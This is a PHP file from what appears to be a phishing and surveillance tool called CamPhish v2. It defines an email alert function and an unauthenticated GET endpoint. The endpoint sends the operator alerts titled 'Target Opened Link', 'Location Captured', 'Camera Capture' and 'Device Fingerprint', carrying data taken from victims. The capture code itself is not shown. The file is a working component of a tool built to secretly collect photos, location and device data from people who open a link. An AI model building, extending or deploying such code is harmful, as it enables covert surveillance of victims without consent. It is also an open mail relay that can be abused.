<?php
// CamPhish v2 - Email Alert System

function sendEmailAlert($to, $subject, $body) {
    if (empty($to)) return false;
    
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
    $headers .= "From: CamPhish Alert <camphish@localhost>\r\n";
    $headers .= "X-Priority: 1\r\n";
    
    $htmlBody = '
    <html>
    <body style="font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px;">
        <div style="max-width: 600px; margin: 0 auto; background: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
            <div style="background: linear-gradient(135deg, #00f5a0, #00d9f5); padding: 20px; text-align: center;">
                <h1 style="color: #000; margin: 0; font-size: 22px;">⚡ CamPhish v2 Alert</h1>
            </div>
            <div style="padding: 25px;">
                <h2 style="color: #333; margin-top: 0;">' . htmlspecialchars($subject) . '</h2>
                <div style="background: #f8f9fa; border-radius: 8px; padding: 15px; font-family: monospace; font-size: 13px; white-space: pre-wrap; color: #444;">' . htmlspecialchars($body) . '</div>
                <p style="color: #999; font-size: 12px; margin-top: 20px;">Time: ' . date('Y-m-d H:i:s') . '</p>
            </div>
        </div>
    </body>
    </html>';
    
    return @mail($to, "CamPhish Alert: " . $subject, $htmlBody, $headers);
}

// Handle API calls from shell script
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $email = isset($_GET['email']) ? $_GET['email'] : '';
    $data = isset($_GET['data']) ? $_GET['data'] : '';
    
    switch ($action) {
        case 'target':
            sendEmailAlert($email, '🎯 Target Opened Link', $data);
            break;
        case 'location':
            sendEmailAlert($email, '📍 Location Captured', $data);
            break;
        case 'photo':
            sendEmailAlert($email, '📸 Camera Capture', $data);
            break;
        case 'fingerprint':
            sendEmailAlert($email, '🔍 Device Fingerprint', $data);
            break;
    }
    
    echo json_encode(['status' => 'sent']);
    exit();
}
?>
